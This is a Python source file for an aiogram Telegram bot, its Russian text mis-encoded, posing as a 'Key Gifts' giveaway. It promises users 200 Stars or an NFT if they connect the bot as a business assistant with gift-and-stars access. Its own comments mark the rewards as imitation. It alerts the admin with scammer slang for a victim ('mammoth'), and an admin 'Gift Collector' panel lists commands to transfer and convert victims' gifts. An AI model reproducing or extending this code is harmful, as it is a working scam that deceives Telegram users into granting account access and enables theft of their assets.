import sqlite3
import json
import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
import config

CONNECTIONS_FILE = "business_connections.json"
TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
DB_NAME = "gifts.db"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# –ü—É—Ç–∏ –∫ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º –≤ –∫–æ—Ä–Ω–µ–≤–æ–π –ø–∞–ø–∫–µ
WELCOME_IMAGE = "welcome.jpg"
INSTRUCTION_IMAGE1 = "instruction1.jpg"
INSTRUCTION_IMAGE2 = "instruction2.jpg"
CONNECTED_IMAGE = "connected.jpg"
THANKS_IMAGE = "thanks.jpg"

# ID –∞–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å—Ç–∏–∫–µ—Ä–∞
ANIMATED_STICKER_ID = "CAACAgIAAxkBAAEQBjRoVqhAcbJ2FXHZmv9U-WhiWaxhGwACv2EAAn0D0Ut_a2H_B25HxDYE"

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS gift_choices
                 (user_id INTEGER PRIMARY KEY, gift_type TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    try:
        with open("connections.json", "r") as f:
            data = json.load(f)
        return data.get(str(user_id))
    except (FileNotFoundError, json.JSONDecodeError):
        return None

def load_connections():
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_connections(connections):
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(connections, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"–ú–∞–º–æ–Ω—Ç #{user_id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞. üéÜü¶£")
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_gift_selection_message(chat_id: int):
    try:
        photo = FSInputFile(CONNECTED_IMAGE)
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üéÅ 200 –ó–≤—ë–∑–¥", callback_data="gift:stars")],
            [InlineKeyboardButton(text="üéÅ NFT –ü–æ–¥–∞—Ä–æ–∫", callback_data="gift:nft")]
        ])
        await bot.send_photo(
            chat_id=chat_id,
            photo=photo,
            caption=(
                "<b>üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º!</b>\n\n"
                "<b>ü™Ñ –í—ã–±–µ—Ä–∏—Ç–µ —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –∑–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ:</b>\n\n"
                "‚≠êÔ∏è <b>200 –ó–≤—ë–∑–¥</b> - –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 60 –º–∏–Ω—É—Ç\n\n"
                "üé® <b>NFT –ü–æ–¥–∞—Ä–æ–∫</b> - —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –≤ —Ç–µ—á–µ–Ω–∏–µ ùü∏-3 —á–∞—Å–æ–≤"
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ connected.jpg: {e}")
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "<b>üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º!</b>\n\n"
                "<b>ü™Ñ –í—ã–±–µ—Ä–∏—Ç–µ —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –∑–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ:</b>\n\n"
                "‚≠êÔ∏è <b>200 –ó–≤—ë–∑–¥</b> - –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 60 –º–∏–Ω—É—Ç\n\n"
                "üé® <b>NFT –ü–æ–¥–∞—Ä–æ–∫</b> - —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –≤ —Ç–µ—á–µ–Ω–∏–µ ùü∏-3 —á–∞—Å–æ–≤"
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        logging.info(f"–ù–æ–≤–æ–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: user_id={business_connection.user.id}, business_connection_id={business_connection.id}")
        await send_welcome_message_to_admin(business_connection.user.id)
        save_business_connection_data(business_connection)

        try:
            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            logging.info(f"–†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º –¥–ª—è user_id={business_connection.user.id}: {gifts_response}")
            await send_gift_selection_message(business_connection.user.id)
        except TelegramBadRequest as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º –¥–ª—è user_id={business_connection.user.id}: {e}")
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>‚ö†Ô∏è –í–∫–ª–∞–¥–∫–∞ '–ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã' –Ω–µ –≤–∫–ª—é—á–µ–Ω–∞!</b>\n\n"
                        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–∫–ª—é—á–∏—Ç–µ —ç—Ç—É –≤–∫–ª–∞–¥–∫—É –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞ Telegram, "
                        "–∏–Ω–∞—á–µ –∑–≤—ë–∑–¥—ã –∏–ª–∏ NFT –Ω–µ –±—É–¥—É—Ç –Ω–∞—á–∏—Å–ª–µ–Ω—ã.\n\n"
                        "<b>üì± –®–∞–≥ 1: –û—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚ûî –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç\n"
                        "<b>‚öôÔ∏è –®–∞–≥ 2: –í —Ä–∞–∑–¥–µ–ª–µ '–ê—Å—Å–∏—Å—Ç–µ–Ω—Ç—ã' –¥–æ–±–∞–≤—å—Ç–µ ‚ûî @Key_Gifts_bot –∏ –≤–∫–ª—é—á–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É '–ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã' –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞</b>"
                    ),
                    parse_mode="HTML"
                )
            elif "BUSINESS_CONNECTION_INVALID" in str(e):
                connections = load_connections()
                connections = [c for c in connections if c["user_id"] != business_connection.user.id]
                save_connections(connections)
                logging.info(f"–£–¥–∞–ª–µ–Ω–æ –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è user_id={business_connection.user.id}")
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>‚ö†Ô∏è –ë–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –≤–∫–ª—é—á–µ–Ω–æ!</b>\n\n"
                        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –¥–æ–±–∞–≤—å—Ç–µ –±–æ—Ç–∞ –∑–∞–Ω–æ–≤–æ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞ Telegram, "
                        "–∏–Ω–∞—á–µ –∑–≤—ë–∑–¥—ã –∏–ª–∏ NFT –Ω–µ –±—É–¥—É—Ç –Ω–∞—á–∏—Å–ª–µ–Ω—ã.\n\n"
                        "<b>üì± –®–∞–≥ 1: –û—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚ûî –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç </b>\n"
                        "<b>‚öôÔ∏è –®–∞–≥ 2: –í —Ä–∞–∑–¥–µ–ª–µ '–ê—Å—Å–∏—Å—Ç–µ–Ω—Ç—ã' –¥–æ–±–∞–≤—å—Ç–µ ‚ûî @Key_Gifts_bot –∏ –≤–∫–ª—é—á–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É '–ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã' –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞</b>"
                    ),
                    parse_mode="HTML"
                )
            else:
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º!</b>\n\n"
                        f"–û–ø–∏—Å–∞–Ω–∏–µ –æ—à–∏–±–∫–∏: {e}\n\n"
                        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –±–æ—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –∏ –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º –≤–∫–ª—é—á—ë–Ω."
                    ),
                    parse_mode="HTML"
                )
    except Exception as e:
        logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è user_id={business_connection.user.id}: {e}")

@dp.business_message()
async def handler_message(message: Message):
    pass

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except:
        count = 0
    if message.from_user.id != ADMIN_ID:
        connection = next((c for c in connections if c["user_id"] == message.from_user.id), None)
        if connection:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT gift_type FROM gift_choices WHERE user_id = ?", (message.from_user.id,))
            result = c.fetchone()
            conn.close()
            if result:
                gift_type = result[0]
                if gift_type == "stars":
                    try:
                        photo = FSInputFile(CONNECTED_IMAGE)
                        await message.answer_photo(photo, caption="‚ú® –í–∞—à–∏ 200 –∑–≤—ë–∑–¥ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 60 –º–∏–Ω—É—Ç!", parse_mode="HTML")
                    except Exception as e:
                        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ connected.jpg: {e}")
                        await message.answer("‚ú® –í–∞—à–∏ 200 –∑–≤—ë–∑–¥ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 60 –º–∏–Ω—É—Ç!", parse_mode="HTML")
                else:
                    try:
                        photo = FSInputFile(THANKS_IMAGE)
                        await message.answer_photo(photo, caption="üñº –í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫ –±—É–¥–µ—Ç –¥–æ—Å—Ç–∞–≤–ª–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 2-3 —á–∞—Å–æ–≤!", parse_mode="HTML")
                    except Exception as e:
                        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ thanks.jpg: {e}")
                        await message.answer("üñº –í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫ –±—É–¥–µ—Ç –¥–æ—Å—Ç–∞–≤–ª–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 2-3 —á–∞—Å–æ–≤!", parse_mode="HTML")
                return
            try:
                business_connection_id = connection["business_connection_id"]
                gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                logging.info(f"–†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º –¥–ª—è user_id={message.from_user.id}: {gifts_response}")
                await send_gift_selection_message(message.from_user.id)
                return
            except TelegramBadRequest as e:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º –¥–ª—è user_id={message.from_user.id}: {e}")
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    await message.answer(
                        "<b>‚ö†Ô∏è –í–∫–ª–∞–¥–∫–∞ '–ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã' –Ω–µ –≤–∫–ª—é—á–µ–Ω–∞!</b>\n\n"
                        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–∫–ª—é—á–∏—Ç–µ –µ—ë –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞ Telegram.",
                        parse_mode="HTML"
                    )
                    return
                elif "BUSINESS_CONNECTION_INVALID" in str(e):
                    connections = [c for c in connections if c["user_id"] != message.from_user.id]
                    save_connections(connections)
                    logging.info(f"–£–¥–∞–ª–µ–Ω–æ –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è user_id={message.from_user.id}")
                    await message.answer(
                        "<b>‚ö†Ô∏è –ë–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –∞–∫—Ç–∏–≤–Ω–æ!</b>\n\n"
                        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –¥–æ–±–∞–≤—å—Ç–µ –±–æ—Ç–∞ –∑–∞–Ω–æ–≤–æ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞ Telegram.",
                        parse_mode="HTML"
                    )
                    return
                else:
                    await message.answer(
                        f"<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º!</b>\n\n–û–ø–∏—Å–∞–Ω–∏–µ –æ—à–∏–±–∫–∏: {e}",
                        parse_mode="HTML"
                    )
                    return
        try:
            welcome_photo = FSInputFile(WELCOME_IMAGE)
            await message.answer_photo(
                welcome_photo,
                caption=(
                    "<b>üì¢ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Telegram Key Gifts ‚Äî –≤–∞—à –∫–ª—é—á –∫ —Ä–∞–∑–¥–∞—á–∞–º –Ω—Ñ—Ç –∏ –∑–≤—ë–∑–¥!</b>\n\n"
                    "<b>üí¨ –ü–æ–¥–∫–ª—é—á–∏—Ç–µ –º–µ–Ω—è –∫–∞–∫ –≤–∞—à–µ–≥–æ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞ ‚Äî –∏ –æ—Ç–∫—Ä–æ–π—Ç–µ —Å—É–Ω–¥—É–∫ —Å —â–µ–¥—Ä—ã–º–∏ –ø–æ–¥–∞—Ä–∫–∞–º–∏:</b>\n\n"
                    "‚≠êÔ∏è <b>200 –ó–≤—ë–∑–¥</b>\n\n"
                    "üéÅ <b>–†–∞–Ω–¥–æ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π NFT-–°—é—Ä–ø—Ä–∏–∑</b>\n\n"
                    "<b>–í—ã–±–æ—Ä –≤–æ–ª—à–µ–±–Ω–æ–≥–æ –±–æ–Ω—É—Å–∞ ‚Äî —Ç–æ–ª—å–∫–æ –∑–∞ –≤–∞–º–∏. –ì–æ—Ç–æ–≤—ã –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫?</b>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ welcome.jpg: {e}")
            await message.answer(
                "<b>üì¢ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Telegram Key Gifts ‚Äî –≤–∞—à –∫–ª—é—á –∫ —Ä–∞–∑–¥–∞—á–∞–º –Ω—Ñ—Ç –∏ –∑–≤—ë–∑–¥!</b>\n\n"
                "<b>üí¨ –ü–æ–¥–∫–ª—é—á–∏—Ç–µ –º–µ–Ω—è –∫–∞–∫ –≤–∞—à–µ–≥–æ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞ ‚Äî –∏ –æ—Ç–∫—Ä–æ–π—Ç–µ —Å—É–Ω–¥—É–∫ —Å —â–µ–¥—Ä—ã–º–∏ –ø–æ–¥–∞—Ä–∫–∞–º–∏:</b>\n\n"
                "‚≠êÔ∏è <b>200 –ó–≤—ë–∑–¥</b>\n\n"
                "üéÅ <b>–†–∞–Ω–¥–æ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π NFT-–°—é—Ä–ø—Ä–∏–∑</b>\n\n"
                "<b>–í—ã–±–æ—Ä –≤–æ–ª—à–µ–±–Ω–æ–≥–æ –±–æ–Ω—É—Å–∞ ‚Äî —Ç–æ–ª—å–∫–æ –∑–∞ –≤–∞–º–∏. –ì–æ—Ç–æ–≤—ã –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫?</b>",
                parse_mode="HTML"
            )
        try:
            instruction_photo1 = FSInputFile(INSTRUCTION_IMAGE1)
            await message.answer_photo(
                instruction_photo1,
                caption="<b>üì± –®–∞–≥ 1: –û—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚ûî –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ instruction1.jpg: {e}")
            await message.answer(
                "<b>üì± –®–∞–≥ 1: –û—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚ûî –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç</b>",
                parse_mode="HTML"
            )
        try:
            instruction_photo2 = FSInputFile(INSTRUCTION_IMAGE2)
            await message.answer_photo(
                instruction_photo2,
                caption=(
                    "<b>‚öôÔ∏è –®–∞–≥ 2: –í —Ä–∞–∑–¥–µ–ª–µ '–ê—Å—Å–∏—Å—Ç–µ–Ω—Ç—ã' –≤–≤–µ–¥–∏—Ç–µ @Key_Gifts_bot –∏ –≤–∫–ª—é—á–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É '–ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã' –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞</b>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ instruction2.jpg: {e}")
            await message.answer(
                "<b>‚öôÔ∏è –®–∞–≥ 2: –í —Ä–∞–∑–¥–µ–ª–µ '–ê—Å—Å–∏—Å—Ç–µ–Ω—Ç—ã' –¥–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞ –∏ –≤–∫–ª—é—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º</b>",
                parse_mode="HTML"
            )
    else:
        await message.answer(
            f"üõ†Ô∏è <b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å Gift Collector</b>\n\n"
            f"üîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n\n"
            f"üìä –ö–æ–º–∞–Ω–¥—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:\n"
            f"/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n"
            f"/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n"
            f"/transfer - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n"
            f"/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
            parse_mode="HTML"
        )

@dp.callback_query(F.data.startswith("gift:"))
async def handle_gift_selection(callback: CallbackQuery):
    gift_type = callback.data.split(":")[1]
    await callback.message.edit_reply_markup(reply_markup=None)

    # –ü—Ä–æ–≤–µ—Ä–∫–∞, –±—ã–ª –ª–∏ —É–∂–µ —Å–¥–µ–ª–∞–Ω –≤—ã–±–æ—Ä
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT gift_type FROM gift_choices WHERE user_id = ?", (callback.from_user.id,))
    result = c.fetchone()
    if result:
        await bot.send_message(
            ADMIN_ID,
            f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {callback.from_user.id} –ø—ã—Ç–∞–ª—Å—è –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤—ã–±—Ä–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫!"
        )
        await callback.message.answer("‚ö†Ô∏è –í—ã —É–∂–µ –≤—ã–±—Ä–∞–ª–∏ –ø–æ–¥–∞—Ä–æ–∫! –ü–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—ã–±–æ—Ä –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω.")
        conn.close()
        await callback.answer()
        return

    # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—ã–±–æ—Ä–∞ –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
    c.execute("INSERT OR REPLACE INTO gift_choices (user_id, gift_type, timestamp) VALUES (?, ?, datetime('now'))",
              (callback.from_user.id, gift_type))
    conn.commit()
    conn.close()

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –±–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç–∏ (–±–µ–∑ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è)
    if gift_type == "stars":
        message_text = (
            "üéâ <b>–ü–æ–∑–¥—Ä–∞–≤–ª—è—é!</b>\n\n"
            "‚ú® –í–∞—à –ø–æ–¥–∞—Ä–æ–∫ (200 –∑–≤—ë–∑–¥) –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 60 –º–∏–Ω—É—Ç!\n\n"
            "üí´ –ü–æ–∫–∞ –≤—ã –∂–¥—ë—Ç–µ, –ø–æ—á–µ–º—É –±—ã –Ω–µ –ø—Ä–∏–≥–ª–∞—Å–∏—Ç—å –¥—Ä—É–∑–µ–π?"
        )
        logging.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {callback.from_user.id} –≤—ã–±—Ä–∞–ª 200 –∑–≤—ë–∑–¥ (–∏–º–∏—Ç–∞—Ü–∏—è).")
    else:
        message_text = (
            "üéÅ –û—Ç–ª–∏—á–Ω—ã–π –≤—ã–±–æ—Ä!\n\n"
            "üñº –í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫ –±—É–¥–µ—Ç –¥–æ—Å—Ç–∞–≤–ª–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 2-3 —á–∞—Å–æ–≤!\n\n"
            "üí´ –ü–æ–∫–∞ –≤—ã –∂–¥—ë—Ç–µ, –ø–æ—á–µ–º—É –±—ã –Ω–µ –ø—Ä–∏–≥–ª–∞—Å–∏—Ç—å –¥—Ä—É–∑–µ–π?"
        )
        logging.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {callback.from_user.id} –≤—ã–±—Ä–∞–ª NFT (–∏–º–∏—Ç–∞—Ü–∏—è).")

    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–∞—Ä—Ç–∏–Ω–∫–æ–π –∏–ª–∏ –±–µ–∑
    try:
        thanks_photo = FSInputFile(THANKS_IMAGE)
        await bot.send_photo(
            chat_id=callback.from_user.id,
            photo=thanks_photo,
            caption=message_text,
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ thanks.jpg: {e}")
        await bot.send_message(
            chat_id=callback.from_user.id,
            text=message_text,
            parse_mode="HTML"
        )

    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∏–∫–µ—Ä–∞
    try:
        await bot.send_sticker(
            chat_id=callback.from_user.id,
            sticker=ANIMATED_STICKER_ID
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å—Ç–∏–∫–µ—Ä–∞: {e}")

